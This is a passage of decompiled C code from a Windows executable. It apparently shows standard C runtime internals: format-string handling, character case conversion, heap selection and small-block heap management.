              if (psVar4 == (short *)0x0) {
                psVar4 = (short *)PTR_DAT_0040f964;
              }
              local_28 = 1;
              for (psVar6 = psVar4; (iVar10 != 0 && (*psVar6 != 0)); psVar6 = psVar6 + 1) {
                iVar10 = iVar10 + -1;
              }
              local_14 = (int)psVar6 - (int)psVar4 >> 1;
            }
            else {
              if (psVar4 == (short *)0x0) {
                psVar4 = (short *)PTR_DAT_0040f960;
              }
              local_14 = 0;
              psVar6 = psVar4;
              if (0 < iVar10) {
                do {
                  if (*(byte *)psVar6 == 0) break;
                  if ((PTR_DAT_00411998[(uint)*(byte *)psVar6 * 2 + 1] & 0x80) != 0) {
                    psVar6 = (short *)((int)psVar6 + 1);
                  }
                  psVar6 = (short *)((int)psVar6 + 1);
                  local_14 = local_14 + 1;
                } while ((int)local_14 < iVar10);
              }
            }
            goto LAB_00407084;
          }
          if (uVar3 != 0x75) {
            if (uVar3 != 0x78) goto LAB_00407084;
            local_3c = 0x27;
            goto LAB_00406ee4;
          }
          goto LAB_00406f43;
        }
        piVar5 = (int *)FUN_00406a1e(&param_3);
        if (((uint)local_8 & 0x20) == 0) {
          *piVar5 = local_18;
        }
        else {
          *(undefined2 *)piVar5 = (undefined2)local_18;
        }
        local_40 = 1;
      }
      if (local_38 != (short *)0x0) {
        FUN_00404b0a(local_38);
        local_38 = (short *)0x0;
      }
    }
    uVar8 = *param_2;
    psVar9 = (short *)((uint)psVar9 & 0xffff0000 | (uint)uVar8);
    param_2 = param_2 + 1;
  } while( true );
}



void FUN_004071de(undefined4 param_1,undefined4 param_2,int *param_3)

{
  short sVar1;
  
  sVar1 = FUN_0040a30d(param_1,param_2);
  if (sVar1 == -1) {
    *param_3 = -1;
    return;
  }
  *param_3 = *param_3 + 1;
  return;
}



void FUN_004071fe(undefined4 param_1,int param_2,undefined4 param_3,int *param_4)

{
  if (0 < param_2) {
    do {
      param_2 = param_2 + -1;
      FUN_004071de(param_1,param_3,param_4);
      if (*param_4 == -1) {
        return;
      }
    } while (0 < param_2);
  }
  return;
}



void FUN_0040722f(ushort *param_1,uint param_2,undefined4 param_3,int *param_4)

{
  ushort uVar1;
  uint uVar2;
  
  if (0 < (int)param_2) {
    do {
      uVar2 = param_2 - 1;
      uVar1 = *param_1;
      param_1 = param_1 + 1;
      FUN_004071de(param_2 & 0xffff0000 | (uint)uVar1,param_3,param_4);
      if (*param_4 == -1) {
        return;
      }
      param_2 = uVar2;
    } while (0 < (int)uVar2);
  }
  return;
}



uint FUN_00407268(uint param_1)

{
  ushort uVar1;
  int iVar2;
  uint uVar3;
  undefined4 uStack_8;
  
  uVar1 = (ushort)param_1;
  if (uVar1 == 0xffff) {
    return param_1;
  }
  if (DAT_00412348 == 0) {
    if ((0x40 < uVar1) && (uVar1 < 0x5b)) {
      return param_1 + 0x20;
    }
  }
  else {
    if (uVar1 < 0x100) {
      iVar2 = FUN_00407354(param_1,1);
      if (iVar2 == 0) {
        return param_1 & 0xffff;
      }
    }
    uVar3 = FUN_0040a402(DAT_00412348,0x100,&param_1,1,(int)&uStack_8 + 2,1,0);
    param_1 = uVar3 & 0xffff0000 | param_1 & 0xffff;
    if (uVar3 != 0) {
      param_1 = uVar3 & 0xffff0000 | uStack_8 >> 0x10;
    }
  }
  return param_1;
}



uint FUN_004072dd(uint param_1)

{
  ushort uVar1;
  int iVar2;
  uint uVar3;
  undefined4 uStack_8;
  
  uVar1 = (ushort)param_1;
  if (uVar1 == 0xffff) {
    return param_1;
  }
  if (DAT_00412348 == 0) {
    if ((0x60 < uVar1) && (uVar1 < 0x7b)) {
      return param_1 + 0xffe0;
    }
  }
  else {
    if (uVar1 < 0x100) {
      iVar2 = FUN_00407354(param_1,2);
      if (iVar2 == 0) {
        return param_1 & 0xffff;
      }
    }
    uVar3 = FUN_0040a402(DAT_00412348,0x200,&param_1,1,(int)&uStack_8 + 2,1,0);
    param_1 = uVar3 & 0xffff0000 | param_1 & 0xffff;
    if (uVar3 != 0) {
      param_1 = uVar3 & 0xffff0000 | uStack_8 >> 0x10;
    }
  }
  return param_1;
}



uint FUN_00407354(ushort param_1,ushort param_2)

{
  int iVar1;
  uint local_8;
  
  if (param_1 == 0xffff) {
    return 0;
  }
  if (param_1 < 0x100) {
    local_8 = (uint)*(ushort *)(PTR_DAT_0041199c + (uint)param_1 * 2);
  }
  else {
    iVar1 = FUN_0040a63b(1,&param_1,1,&local_8,0,0);
    if (iVar1 == 0) {
      return 0;
    }
  }
  return local_8 & 0xffff & (uint)param_2;
}



void FUN_004073a6(undefined4 *param_1)

{
  int iVar1;
  HMODULE pHVar2;
  
  *param_1 = 0;
  pHVar2 = GetModuleHandleA((LPCSTR)0x0);
  if ((*(short *)&pHVar2->unused == 0x5a4d) && (iVar1 = pHVar2[0xf].unused, iVar1 != 0)) {
    *(undefined *)param_1 = *(undefined *)((int)&pHVar2[6].unused + iVar1 + 2);
    *(undefined *)((int)param_1 + 1) = *(undefined *)((int)&pHVar2[6].unused + iVar1 + 3);
  }
  return;
}



int FUN_004073d3(void)

{
  char cVar1;
  BOOL BVar2;
  int iVar3;
  DWORD DVar4;
  char *pcVar5;
  undefined4 unaff_EBX;
  char local_1230 [4240];
  char local_1a0 [260];
  DWORD local_9c;
  uint local_98;
  DWORD local_8c;
  undefined4 uStackY_18;
  byte bVar6;
  
  bVar6 = (byte)unaff_EBX;
  FUN_00404830();
  local_9c = 0x94;
  BVar2 = GetVersionExA((LPOSVERSIONINFOA)&local_9c);
  if (((BVar2 == 0) || (local_8c != 2)) || (local_98 < 5)) {
    uStackY_18 = 0x40742d;
    DVar4 = GetEnvironmentVariableA("__MSVCRT_HEAP_SELECT",local_1230,0x1090);
    if (DVar4 != 0) {
      pcVar5 = local_1230;
      while (local_1230[0] != '\0') {
        cVar1 = *pcVar5;
        if (('`' < cVar1) && (cVar1 < '{')) {
          *pcVar5 = cVar1 + -0x20;
        }
        pcVar5 = pcVar5 + 1;
        local_1230[0] = *pcVar5;
      }
      uStackY_18 = 0x40746b;
      iVar3 = _strncmp("__GLOBAL_HEAP_SELECTED",local_1230,0x16);
      if (iVar3 == 0) {
        pcVar5 = local_1230;
      }
      else {
        uStackY_18 = 0x40748d;
        GetModuleFileNameA((HMODULE)0x0,local_1a0,0x104);
        pcVar5 = local_1a0;
        while (local_1a0[0] != '\0') {
          cVar1 = *pcVar5;
          if (('`' < cVar1) && (cVar1 < '{')) {
            *pcVar5 = cVar1 + -0x20;
          }
          bVar6 = (byte)unaff_EBX;
          pcVar5 = pcVar5 + 1;
          local_1a0[0] = *pcVar5;
        }
        pcVar5 = (char *)FUN_00404d80();
      }
      if ((pcVar5 != (char *)0x0) && (iVar3 = FUN_004092f0(), iVar3 != 0)) {
        pcVar5 = (char *)(iVar3 + 1);
        cVar1 = *pcVar5;
        while (cVar1 != '\0') {
          if (*pcVar5 == ';') {
            *pcVar5 = '\0';
          }
          else {
            pcVar5 = pcVar5 + 1;
          }
          cVar1 = *pcVar5;
        }
        uStackY_18 = 0x4074f3;
        iVar3 = FUN_0040a800();
        if (iVar3 == 2) {
          return 2;
        }
        if (iVar3 == 3) {
          return 3;
        }
        if (iVar3 == 1) {
          return 1;
        }
      }
    }
    FUN_004073a6();
    iVar3 = 3 - (uint)(bVar6 < 6);
  }
  else {
    iVar3 = 1;
  }
  return iVar3;
}



undefined4 FUN_0040751b(int param_1)

{
  int iVar1;
  
  DAT_00413900 = HeapCreate((uint)(param_1 == 0),0x1000,0);
  if (DAT_00413900 != (HANDLE)0x0) {
    DAT_00413904 = FUN_004073d3();
    if (DAT_00413904 == 3) {
      iVar1 = FUN_00407578(0x3f8);
    }
    else {
      if (DAT_00413904 != 2) {
        return 1;
      }
      iVar1 = FUN_004080bf();
    }
    if (iVar1 != 0) {
      return 1;
    }
    HeapDestroy(DAT_00413900);
  }
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_00407578(undefined4 param_1)

{
  DAT_004138f8 = HeapAlloc(DAT_00413900,0,0x140);
  if (DAT_004138f8 == (LPVOID)0x0) {
    return 0;
  }
  DAT_004138f0 = 0;
  DAT_004138f4 = 0;
  DAT_004138ec = DAT_004138f8;
  _DAT_004138fc = param_1;
  DAT_004138e4 = 0x10;
  return 1;
}



uint FUN_004075c0(int param_1)

{
  uint uVar1;
  
  uVar1 = DAT_004138f8;
  while( true ) {
    if (DAT_004138f8 + DAT_004138f4 * 0x14 <= uVar1) {
      return 0;
    }
    if ((uint)(param_1 - *(int *)(uVar1 + 0xc)) < 0x100000) break;
    uVar1 = uVar1 + 0x14;
  }
  return uVar1;
}



void FUN_004075eb(uint *param_1,int param_2)

{
  char *pcVar1;
  uint *puVar2;
  int *piVar3;
  char cVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  byte bVar8;
  uint uVar9;
  uint *puVar10;
  uint *puVar11;
  uint *puVar12;
  uint uVar13;
  uint uVar14;
  uint local_8;
  
  uVar5 = param_1[4];
  puVar12 = (uint *)(param_2 + -4);
  uVar14 = param_2 - param_1[3] >> 0xf;
  piVar3 = (int *)(uVar14 * 0x204 + 0x144 + uVar5);
  uVar13 = *puVar12;
  local_8 = uVar13 - 1;
  if ((local_8 & 1) == 0) {
    uVar6 = *(uint *)(local_8 + (int)puVar12);
    uVar7 = *(uint *)(param_2 + -8);
    if ((uVar6 & 1) == 0) {
      uVar9 = ((int)uVar6 >> 4) - 1;
      if (0x3f < uVar9) {
        uVar9 = 0x3f;
      }
      if (*(int *)((int)puVar12 + uVar13 + 3) == *(int *)((int)puVar12 + uVar13 + 7)) {
        if (uVar9 < 0x20) {
          pcVar1 = (char *)(uVar9 + 4 + uVar5);
          uVar9 = ~(0x80000000U >> ((byte)uVar9 & 0x1f));
          puVar10 = (uint *)(uVar5 + 0x44 + uVar14 * 4);
          *puVar10 = *puVar10 & uVar9;
          *pcVar1 = *pcVar1 + -1;
          if (*pcVar1 == '\0') {
            *param_1 = *param_1 & uVar9;
          }
        }
        else {
          pcVar1 = (char *)(uVar9 + 4 + uVar5);
          uVar9 = ~(0x80000000U >> ((byte)uVar9 - 0x20 & 0x1f));
          puVar10 = (uint *)(uVar5 + 0xc4 + uVar14 * 4);
          *puVar10 = *puVar10 & uVar9;
          *pcVar1 = *pcVar1 + -1;
          if (*pcVar1 == '\0') {
            param_1[1] = param_1[1] & uVar9;
          }
        }
      }
      local_8 = local_8 + uVar6;
      *(undefined4 *)(*(int *)((int)puVar12 + uVar13 + 7) + 4) =
           *(undefined4 *)((int)puVar12 + uVar13 + 3);
      *(undefined4 *)(*(int *)((int)puVar12 + uVar13 + 3) + 8) =
           *(undefined4 *)((int)puVar12 + uVar13 + 7);
    }
    puVar10 = (uint *)(((int)local_8 >> 4) + -1);
    if ((uint *)0x3f < puVar10) {
      puVar10 = (uint *)0x3f;
    }
    puVar11 = param_1;
    if ((uVar7 & 1) == 0) {
      puVar12 = (uint *)((int)puVar12 - uVar7);
      puVar11 = (uint *)(((int)uVar7 >> 4) + -1);
      if ((uint *)0x3f < puVar11) {
        puVar11 = (uint *)0x3f;
      }
      local_8 = local_8 + uVar7;
      puVar10 = (uint *)(((int)local_8 >> 4) + -1);
      if ((uint *)0x3f < puVar10) {
        puVar10 = (uint *)0x3f;
      }
      if (puVar11 != puVar10) {
        if (puVar12[1] == puVar12[2]) {
          if (puVar11 < (uint *)0x20) {
            uVar13 = ~(0x80000000U >> ((byte)puVar11 & 0x1f));
            puVar2 = (uint *)(uVar5 + 0x44 + uVar14 * 4);
            *puVar2 = *puVar2 & uVar13;
            pcVar1 = (char *)((int)puVar11 + uVar5 + 4);
            *pcVar1 = *pcVar1 + -1;
            if (*pcVar1 == '\0') {
              *param_1 = *param_1 & uVar13;
            }
          }
          else {
            uVar13 = ~(0x80000000U >> ((byte)puVar11 - 0x20 & 0x1f));
            puVar2 = (uint *)(uVar5 + 0xc4 + uVar14 * 4);
            *puVar2 = *puVar2 & uVar13;
            pcVar1 = (char *)((int)puVar11 + uVar5 + 4);
            *pcVar1 = *pcVar1 + -1;
            if (*pcVar1 == '\0') {
              param_1[1] = param_1[1] & uVar13;
            }
          }
        }
        *(uint *)(puVar12[2] + 4) = puVar12[1];
        *(uint *)(puVar12[1] + 8) = puVar12[2];
      }
    }
    if (((uVar7 & 1) != 0) || (puVar11 != puVar10)) {
      puVar12[1] = piVar3[(int)puVar10 * 2 + 1];
      puVar12[2] = (uint)(piVar3 + (int)puVar10 * 2);
      (piVar3 + (int)puVar10 * 2)[1] = (int)puVar12;
      *(uint **)(puVar12[1] + 8) = puVar12;
      if (puVar12[1] == puVar12[2]) {
        cVar4 = *(char *)((int)puVar10 + uVar5 + 4);
        *(char *)((int)puVar10 + uVar5 + 4) = cVar4 + '\x01';
        bVar8 = (byte)puVar10;
        if (puVar10 < (uint *)0x20) {
          if (cVar4 == '\0') {
            *param_1 = *param_1 | 0x80000000U >> (bVar8 & 0x1f);
          }
          puVar10 = (uint *)(uVar5 + 0x44 + uVar14 * 4);
          *puVar10 = *puVar10 | 0x80000000U >> (bVar8 & 0x1f);
        }
        else {
          if (cVar4 == '\0') {
            param_1[1] = param_1[1] | 0x80000000U >> (bVar8 - 0x20 & 0x1f);
          }
          puVar10 = (uint *)(uVar5 + 0xc4 + uVar14 * 4);
          *puVar10 = *puVar10 | 0x80000000U >> (bVar8 - 0x20 & 0x1f);
        }
      }
    }
    *puVar12 = local_8;
    *(uint *)((local_8 - 4) + (int)puVar12) = local_8;
    *piVar3 = *piVar3 + -1;
    if (*piVar3 == 0) {
      if (DAT_004138f0 != (uint *)0x0) {
        VirtualFree((LPVOID)(DAT_004138e8 * 0x8000 + DAT_004138f0[3]),0x8000,0x4000);
        DAT_004138f0[2] = DAT_004138f0[2] | 0x80000000U >> ((byte)DAT_004138e8 & 0x1f);
        *(undefined4 *)(DAT_004138f0[4] + 0xc4 + DAT_004138e8 * 4) = 0;
        *(char *)(DAT_004138f0[4] + 0x43) = *(char *)(DAT_004138f0[4] + 0x43) + -1;
        if (*(char *)(DAT_004138f0[4] + 0x43) == '\0') {
          DAT_004138f0[1] = DAT_004138f0[1] & 0xfffffffe;
        }
        if (DAT_004138f0[2] == 0xffffffff) {
          VirtualFree((LPVOID)DAT_004138f0[3],0,0x8000);
          HeapFree(DAT_00413900,0,(LPVOID)DAT_004138f0[4]);
          FUN_004041b0(DAT_004138f0,DAT_004138f0 + 5,
                       (DAT_004138f4 * 0x14 - (int)DAT_004138f0) + -0x14 + DAT_004138f8);
          DAT_004138f4 = DAT_004138f4 + -1;
          if (DAT_004138f0 < param_1) {
            param_1 = param_1 + -5;
          }
          DAT_004138ec = DAT_004138f8;
        }
      }
      DAT_004138f0 = param_1;
      DAT_004138e8 = uVar14;
    }
  }
  return;
}



int * FUN_00407914(uint *param_1)

{
  char *pcVar1;
  int *piVar2;
  char cVar3;
  int *piVar4;
  undefined4 uVar5;
  byte bVar6;
  uint uVar7;
  int iVar8;
  uint *puVar9;
  int iVar10;
  uint uVar11;
  int *piVar12;
  uint *puVar13;
  uint *puVar14;
  int iVar15;
  uint local_10;
  uint local_c;
  int local_8;
  
  puVar9 = DAT_004138f8 + DAT_004138f4 * 5;
  uVar7 = (int)param_1 + 0x17U & 0xfffffff0;
  iVar8 = ((int)((int)param_1 + 0x17U) >> 4) + -1;
  bVar6 = (byte)iVar8;
  if (iVar8 < 0x20) {
    local_10 = 0xffffffff >> (bVar6 & 0x1f);
    local_c = 0xffffffff;
  }
  else {
    local_c = 0xffffffff >> (bVar6 - 0x20 & 0x1f);
    local_10 = 0;
  }
  param_1 = DAT_004138ec;
  if (DAT_004138ec < puVar9) {
    do {
      if ((param_1[1] & local_c | *param_1 & local_10) != 0) break;
      param_1 = param_1 + 5;
    } while (param_1 < puVar9);
  }
  puVar13 = DAT_004138f8;
  if (param_1 == puVar9) {
    for (; (puVar13 < DAT_004138ec && ((puVar13[1] & local_c | *puVar13 & local_10) == 0));
        puVar13 = puVar13 + 5) {
    }
    param_1 = puVar13;
    if (puVar13 == DAT_004138ec) {
      for (; (puVar13 < puVar9 && (puVar13[2] == 0)); puVar13 = puVar13 + 5) {
      }
      puVar14 = DAT_004138f8;
      param_1 = puVar13;
      if (puVar13 == puVar9) {
        for (; (puVar14 < DAT_004138ec && (puVar14[2] == 0)); puVar14 = puVar14 + 5) {
        }
        param_1 = puVar14;
        if ((puVar14 == DAT_004138ec) && (param_1 = (uint *)FUN_00407c1d(), param_1 == (uint *)0x0))
        {
          return (int *)0x0;
        }
      }
      uVar5 = FUN_00407cce(param_1);
      *(undefined4 *)param_1[4] = uVar5;
      if (*(int *)param_1[4] == -1) {
        return (int *)0x0;
      }
    }
  }
  piVar4 = (int *)param_1[4];
  local_8 = *piVar4;
  if ((local_8 == -1) ||
     ((piVar4[local_8 + 0x31] & local_c | piVar4[local_8 + 0x11] & local_10) == 0)) {
    local_8 = 0;
    puVar9 = (uint *)(piVar4 + 0x11);
    uVar11 = piVar4[0x31] & local_c | piVar4[0x11] & local_10;
    while (uVar11 == 0) {
      puVar13 = puVar9 + 0x21;
      local_8 = local_8 + 1;
      puVar9 = puVar9 + 1;
      uVar11 = *puVar13 & local_c | local_10 & *puVar9;
    }
  }
  iVar8 = 0;
  piVar2 = piVar4 + local_8 * 0x81 + 0x51;
  local_10 = piVar4[local_8 + 0x11] & local_10;
  if (local_10 == 0) {
    local_10 = piVar4[local_8 + 0x31] & local_c;
    iVar8 = 0x20;
  }
  for (; -1 < (int)local_10; local_10 = local_10 << 1) {
    iVar8 = iVar8 + 1;
  }
  piVar12 = (int *)piVar2[iVar8 * 2 + 1];
  iVar10 = *piVar12 - uVar7;
  iVar15 = (iVar10 >> 4) + -1;
  if (0x3f < iVar15) {
    iVar15 = 0x3f;
  }
  DAT_004138ec = param_1;
  if (iVar15 != iVar8) {
    if (piVar12[1] == piVar12[2]) {
      if (iVar8 < 0x20) {
        pcVar1 = (char *)((int)piVar4 + iVar8 + 4);
        uVar11 = ~(0x80000000U >> ((byte)iVar8 & 0x1f));
        piVar4[local_8 + 0x11] = uVar11 & piVar4[local_8 + 0x11];
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          *param_1 = *param_1 & uVar11;
        }
      }
      else {
        pcVar1 = (char *)((int)piVar4 + iVar8 + 4);
        uVar11 = ~(0x80000000U >> ((byte)iVar8 - 0x20 & 0x1f));
        piVar4[local_8 + 0x31] = piVar4[local_8 + 0x31] & uVar11;
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          param_1[1] = param_1[1] & uVar11;
        }
      }
    }
    *(int *)(piVar12[2] + 4) = piVar12[1];
    *(int *)(piVar12[1] + 8) = piVar12[2];
    if (iVar10 == 0) goto LAB_00407bda;
    piVar12[1] = piVar2[iVar15 * 2 + 1];
    piVar12[2] = (int)(piVar2 + iVar15 * 2);
    (piVar2 + iVar15 * 2)[1] = (int)piVar12;
    *(int **)(piVar12[1] + 8) = piVar12;
    if (piVar12[1] == piVar12[2]) {
      cVar3 = *(char *)(iVar15 + 4 + (int)piVar4);
      bVar6 = (byte)iVar15;
      if (iVar15 < 0x20) {
        *(char *)(iVar15 + 4 + (int)piVar4) = cVar3 + '\x01';
        if (cVar3 == '\0') {
          *param_1 = *param_1 | 0x80000000U >> (bVar6 & 0x1f);
        }
        piVar4[local_8 + 0x11] = piVar4[local_8 + 0x11] | 0x80000000U >> (bVar6 & 0x1f);
      }
      else {
        *(char *)(iVar15 + 4 + (int)piVar4) = cVar3 + '\x01';
        if (cVar3 == '\0') {
          param_1[1] = param_1[1] | 0x80000000U >> (bVar6 - 0x20 & 0x1f);
        }
        piVar4[local_8 + 0x31] = piVar4[local_8 + 0x31] | 0x80000000U >> (bVar6 - 0x20 & 0x1f);
      }
    }
  }
  if (iVar10 != 0) {
    *piVar12 = iVar10;
    *(int *)(iVar10 + -4 + (int)piVar12) = iVar10;
  }
LAB_00407bda:
  piVar12 = (int *)((int)piVar12 + iVar10);
  *piVar12 = uVar7 + 1;
  *(uint *)((int)piVar12 + (uVar7 - 4)) = uVar7 + 1;
  iVar8 = *piVar2;
  *piVar2 = iVar8 + 1;
  if (((iVar8 == 0) && (param_1 == DAT_004138f0)) && (local_8 == DAT_004138e8)) {
    DAT_004138f0 = (uint *)0x0;
  }
  *piVar4 = local_8;
  return piVar12 + 1;
}



undefined4 * FUN_00407c1d(void)

{
  undefined4 *puVar1;
  LPVOID pvVar2;
  
  if (DAT_004138f4 == DAT_004138e4) {
    pvVar2 = HeapReAlloc(DAT_00413900,0,DAT_004138f8,(DAT_004138e4 * 5 + 0x50) * 4);
    if (pvVar2 == (LPVOID)0x0) {
      return (undefined4 *)0x0;
    }
    DAT_004138e4 = DAT_004138e4 + 0x10;
    DAT_004138f8 = pvVar2;
  }
  puVar1 = (undefined4 *)((int)DAT_004138f8 + DAT_004138f4 * 0x14);
  pvVar2 = HeapAlloc(DAT_00413900,8,0x41c4);
  puVar1[4] = pvVar2;
  if (pvVar2 != (LPVOID)0x0) {
    pvVar2 = VirtualAlloc((LPVOID)0x0,0x100000,0x2000,4);
    puVar1[3] = pvVar2;
    if (pvVar2 != (LPVOID)0x0) {
      puVar1[2] = 0xffffffff;
      *puVar1 = 0;
      puVar1[1] = 0;
      DAT_004138f4 = DAT_004138f4 + 1;
      *(undefined4 *)puVar1[4] = 0xffffffff;
      return puVar1;
    }
    HeapFree(DAT_00413900,0,(LPVOID)puVar1[4]);
  }
  return (undefined4 *)0x0;
}



int FUN_00407cce(int param_1)

{
  int *piVar1;
  char cVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  LPVOID pvVar6;
  int *piVar7;
  int iVar8;
  int iVar9;
  int *lpAddress;
  
  iVar3 = *(int *)(param_1 + 0x10);
  iVar9 = 0;
  for (iVar4 = *(int *)(param_1 + 8); -1 < iVar4; iVar4 = iVar4 << 1) {
    iVar9 = iVar9 + 1;
  }
  iVar8 = 0x3f;
  iVar4 = iVar9 * 0x204 + 0x144 + iVar3;
  iVar5 = iVar4;
  do {
    *(int *)(iVar5 + 8) = iVar5;
    *(int *)(iVar5 + 4) = iVar5;
    iVar5 = iVar5 + 8;
    iVar8 = iVar8 + -1;
  } while (iVar8 != 0);
  lpAddress = (int *)(iVar9 * 0x8000 + *(int *)(param_1 + 0xc));
  pvVar6 = VirtualAlloc(lpAddress,0x8000,0x1000,4);
  if (pvVar6 == (LPVOID)0x0) {
    iVar9 = -1;
  }
  else {
    if (lpAddress <= lpAddress + 0x1c00) {
      piVar7 = lpAddress + 4;
      do {
        piVar7[-2] = -1;
        piVar7[0x3fb] = -1;
        piVar7[-1] = 0xff0;
        *piVar7 = (int)(piVar7 + 0x3ff);
        piVar7[1] = (int)(piVar7 + -0x401);
        piVar7[0x3fa] = 0xff0;
        piVar1 = piVar7 + 0x3fc;
        piVar7 = piVar7 + 0x400;
      } while (piVar1 <= lpAddress + 0x1c00);
    }
    *(int **)(iVar4 + 0x1fc) = lpAddress + 3;
    lpAddress[5] = iVar4 + 0x1f8;
    *(int **)(iVar4 + 0x200) = lpAddress + 0x1c03;
    lpAddress[0x1c04] = iVar4 + 0x1f8;
    *(undefined4 *)(iVar3 + 0x44 + iVar9 * 4) = 0;
    *(undefined4 *)(iVar3 + 0xc4 + iVar9 * 4) = 1;
    cVar2 = *(char *)(iVar3 + 0x43);
    *(char *)(iVar3 + 0x43) = cVar2 + '\x01';
    if (cVar2 == '\0') {
      *(uint *)(param_1 + 4) = *(uint *)(param_1 + 4) | 1;
    }
    *(uint *)(param_1 + 8) = *(uint *)(param_1 + 8) & ~(0x80000000U >> ((byte)iVar9 & 0x1f));
  }
  return iVar9;
}



undefined4 FUN_00407dc9(uint *param_1,int param_2,int param_3)

{
  char *pcVar1;
  int iVar2;
  int *piVar3;
  int iVar4;
  char cVar5;
  uint uVar6;
  int iVar7;
  uint *puVar8;
  byte bVar9;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  uint uVar13;
  uint local_c;
  
  uVar6 = param_1[4];
  uVar12 = param_3 + 0x17U & 0xfffffff0;
  uVar10 = param_2 - param_1[3] >> 0xf;
  iVar4 = uVar10 * 0x204 + 0x144 + uVar6;
  iVar7 = *(int *)(param_2 + -4);
  param_3 = iVar7 + -1;
  uVar13 = *(uint *)(iVar7 + -5 + param_2);
  iVar7 = iVar7 + -5 + param_2;
  if (param_3 < (int)uVar12) {
    if (((uVar13 & 1) != 0) || ((int)(uVar13 + param_3) < (int)uVar12)) {
      return 0;
    }
    local_c = ((int)uVar13 >> 4) - 1;
    if (0x3f < local_c) {
      local_c = 0x3f;
    }
    if (*(int *)(iVar7 + 4) == *(int *)(iVar7 + 8)) {
      if (local_c < 0x20) {
        pcVar1 = (char *)(local_c + 4 + uVar6);
        uVar11 = ~(0x80000000U >> ((byte)local_c & 0x1f));
        puVar8 = (uint *)(uVar6 + 0x44 + uVar10 * 4);
        *puVar8 = *puVar8 & uVar11;
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          *param_1 = *param_1 & uVar11;
        }
      }
      else {
        pcVar1 = (char *)(local_c + 4 + uVar6);
        uVar11 = ~(0x80000000U >> ((byte)local_c - 0x20 & 0x1f));
        puVar8 = (uint *)(uVar6 + 0xc4 + uVar10 * 4);
        *puVar8 = *puVar8 & uVar11;
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          param_1[1] = param_1[1] & uVar11;
        }
      }
    }
    *(undefined4 *)(*(int *)(iVar7 + 8) + 4) = *(undefined4 *)(iVar7 + 4);
    *(undefined4 *)(*(int *)(iVar7 + 4) + 8) = *(undefined4 *)(iVar7 + 8);
    iVar7 = uVar13 + (param_3 - uVar12);
    if (0 < iVar7) {
      uVar13 = (iVar7 >> 4) - 1;
      iVar2 = param_2 + -4 + uVar12;
      if (0x3f < uVar13) {
        uVar13 = 0x3f;
      }
      iVar4 = iVar4 + uVar13 * 8;
      *(undefined4 *)(iVar2 + 4) = *(undefined4 *)(iVar4 + 4);
      *(int *)(iVar2 + 8) = iVar4;
      *(int *)(iVar4 + 4) = iVar2;
      *(int *)(*(int *)(iVar2 + 4) + 8) = iVar2;
      if (*(int *)(iVar2 + 4) == *(int *)(iVar2 + 8)) {
        cVar5 = *(char *)(uVar13 + 4 + uVar6);
        *(char *)(uVar13 + 4 + uVar6) = cVar5 + '\x01';
        bVar9 = (byte)uVar13;
        if (uVar13 < 0x20) {
          if (cVar5 == '\0') {
            *param_1 = *param_1 | 0x80000000U >> (bVar9 & 0x1f);
          }
          puVar8 = (uint *)(uVar6 + 0x44 + uVar10 * 4);
        }
        else {
          if (cVar5 == '\0') {
            param_1[1] = param_1[1] | 0x80000000U >> (bVar9 - 0x20 & 0x1f);
          }
          puVar8 = (uint *)(uVar6 + 0xc4 + uVar10 * 4);
          bVar9 = bVar9 - 0x20;
        }
        *puVar8 = *puVar8 | 0x80000000U >> (bVar9 & 0x1f);
      }
      piVar3 = (int *)(param_2 + -4 + uVar12);
      *piVar3 = iVar7;
      *(int *)(iVar7 + -4 + (int)piVar3) = iVar7;
    }
    *(uint *)(param_2 + -4) = uVar12 + 1;
    *(uint *)(param_2 + -8 + uVar12) = uVar12 + 1;
  }
  else if ((int)uVar12 < param_3) {
    param_3 = param_3 - uVar12;
    *(uint *)(param_2 + -4) = uVar12 + 1;
    piVar3 = (int *)(param_2 + -4 + uVar12);
    uVar11 = (param_3 >> 4) - 1;
    piVar3[-1] = uVar12 + 1;
    if (0x3f < uVar11) {
      uVar11 = 0x3f;
    }
    if ((uVar13 & 1) == 0) {
      uVar12 = ((int)uVar13 >> 4) - 1;
      if (0x3f < uVar12) {
        uVar12 = 0x3f;
      }
      if (*(int *)(iVar7 + 4) == *(int *)(iVar7 + 8)) {
        if (uVar12 < 0x20) {
          pcVar1 = (char *)(uVar12 + 4 + uVar6);
          uVar12 = ~(0x80000000U >> ((byte)uVar12 & 0x1f));
          puVar8 = (uint *)(uVar6 + 0x44 + uVar10 * 4);
          *puVar8 = *puVar8 & uVar12;
          *pcVar1 = *pcVar1 + -1;
          if (*pcVar1 == '\0') {
            *param_1 = *param_1 & uVar12;
          }
        }
        else {
          pcVar1 = (char *)(uVar12 + 4 + uVar6);
          uVar12 = ~(0x80000000U >> ((byte)uVar12 - 0x20 & 0x1f));
          puVar8 = (uint *)(uVar6 + 0xc4 + uVar10 * 4);
          *puVar8 = *puVar8 & uVar12;
          *pcVar1 = *pcVar1 + -1;
          if (*pcVar1 == '\0') {
            param_1[1] = param_1[1] & uVar12;
          }
        }
      }
      *(undefined4 *)(*(int *)(iVar7 + 8) + 4) = *(undefined4 *)(iVar7 + 4);
      *(undefined4 *)(*(int *)(iVar7 + 4) + 8) = *(undefined4 *)(iVar7 + 8);
      param_3 = param_3 + uVar13;
      uVar11 = (param_3 >> 4) - 1;
      if (0x3f < uVar11) {
        uVar11 = 0x3f;
      }
    }
    iVar7 = iVar4 + uVar11 * 8;
    piVar3[1] = *(int *)(iVar4 + 4 + uVar11 * 8);
    piVar3[2] = iVar7;
    *(int **)(iVar7 + 4) = piVar3;
    *(int **)(piVar3[1] + 8) = piVar3;
    if (piVar3[1] == piVar3[2]) {
      cVar5 = *(char *)(uVar11 + 4 + uVar6);
      *(char *)(uVar11 + 4 + uVar6) = cVar5 + '\x01';
      bVar9 = (byte)uVar11;
      if (uVar11 < 0x20) {
        if (cVar5 == '\0') {
          *param_1 = *param_1 | 0x80000000U >> (bVar9 & 0x1f);
        }
        puVar8 = (uint *)(uVar6 + 0x44 + uVar10 * 4);
      }
      else {
        if (cVar5 == '\0') {
          param_1[1] = param_1[1] | 0x80000000U >> (bVar9 - 0x20 & 0x1f);
        }
